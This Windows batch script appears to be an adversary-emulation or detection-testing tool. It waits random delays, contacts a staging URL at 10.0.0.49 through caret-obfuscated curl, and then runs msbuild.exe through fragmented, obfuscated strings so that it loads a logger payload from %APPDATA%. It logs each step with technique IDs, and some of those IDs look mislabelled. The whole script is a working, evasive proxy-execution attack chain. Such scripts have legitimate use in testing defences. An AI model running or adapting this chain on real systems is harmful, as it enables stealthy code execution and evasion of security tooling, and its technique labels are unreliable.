@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - NO obfuscation)
SET fhjkwe=%APPDATA%\8214\30e1d2a4
SET uoqirw=https://10.0.0.49
SET snvbjk=https://10.0.0.49/stage/2/icon.png?8214-7
SET lpoiyu=ITZEL-S2BO
SET wwqter=7
SET bbvcxz=wimrar.txt
SET mmmqqq=8214

REM Script variables (random names)
SET xxvvcc=%APPDATA%\%wwqter%\macula-simulations.log
SET rndseed=%RANDOM%

echo [%DATE% %TIME%][DEBUG][%lpoiyu%]: script_start>> "%xxvvcc%" 2>nul

REM Initial random delay (45-75s)
SET /A dly1=%rndseed% %% 31 + 45
echo [%DATE% %TIME%][DEBUG][%lpoiyu%]: initial_delay=!dly1!s>> "%xxvvcc%" 2>nul
timeout /t !dly1! /nobreak >nul

REM Heartbeat check with fixed curl implementation
echo [%DATE% %TIME%][DEBUG][%lpoiyu%]: heartbeat_check_start>> "%xxvvcc%" 2>nul

REM Simple caret escape ONLY on curl command - reliable syntax
SET curlcmd=c^u^r^l

REM Execute curl with proper flags and URL
%curlcmd% -k -s -o nul "!snvbjk!"
SET hberr=!ERRORLEVEL!

REM Check and log result
IF !hberr! EQU 0 (
  SET hbresult=1
  SET hberror=
  echo [%DATE% %TIME%][DEBUG][%lpoiyu%]: heartbeat_success>> "%xxvvcc%" 2>nul
) ELSE (
  SET hbresult=0
  SET hberror=curl_!hberr!
  echo [%DATE% %TIME%][DEBUG][%lpoiyu%]: heartbeat_failed error=!hberr!>> "%xxvvcc%" 2>nul
)

REM Log TTP for heartbeat check
SET _time=!TIME: =0!
SET _timestamp=!DATE:~6,4!-!DATE:~3,2!-!DATE:~0,2! !_time:~0,2!:!_time:~3,2!:!_time:~6,2!.!_time:~9,2!
echo [!_timestamp!][%lpoiyu%]: %wwqter%-%mmmqqq%-T1218.001|MSBuild=!hbresult!:!hberror!>> "%xxvvcc%" 2>nul

REM Random delay 10-20s
SET /A dly2=%rndseed% %% 11 + 10
echo [%DATE% %TIME%][DEBUG][%lpoiyu%]: mid_delay=!dly2!s>> "%xxvvcc%" 2>nul
ping -n !dly2! 127.0.0.1 >nul

REM Prepare MSBuild command with fragmentation
SET ms1=m^s^b
SET ms2=u^i^l^d^.
SET ms3=e^x^e
SET lg1=^/^l^o^g^g^e^r^:^L^o^g^g^e^r^E^n^t^r^y^,
SET lg2=^;^M^y^P^a^r^a^m^e^t^e^r^s^,^F^o^o

REM Construct and execute
SET msbcmd=!ms1!!ms2!!ms3!
SET msbargs=!lg1!!fhjkwe!\\!bbvcxz!!lg2!

echo [%DATE% %TIME%][DEBUG][%lpoiyu%]: msbuild_cmd=!msbcmd! !msbargs!>> "%xxvvcc%" 2>nul
CALL !msbcmd! !msbargs!
SET mserr=!ERRORLEVEL!

REM Check result and log TTP
IF !mserr! EQU 0 (
  SET msresult=1
  SET mserror=
) ELSE (
  SET msresult=0
  SET mserror=msbuild_!mserr!
)

SET _time=!TIME: =0!
SET _timestamp=!DATE:~6,4!-!DATE:~3,2!-!DATE:~0,2! !_time:~0,2!:!_time:~3,2!:!_time:~6,2!.!_time:~9,2!
echo [!_timestamp!][%lpoiyu%]: %wwqter%-%mmmqqq%-T1218.002|Trusted Developer Utilities Proxy Execution=!msresult!:!mserror!>> "%xxvvcc%" 2>nul

REM Final delay 15-30s
SET /A dly3=%rndseed% %% 16 + 15
echo [%DATE% %TIME%][DEBUG][%lpoiyu%]: final_delay=!dly3!s>> "%xxvvcc%" 2>nul
CHOICE /C Y /N /D Y /T !dly3! >nul

echo [%DATE% %TIME%][DEBUG][%lpoiyu%]: script_complete>> "%xxvvcc%" 2>nul

ENDLOCAL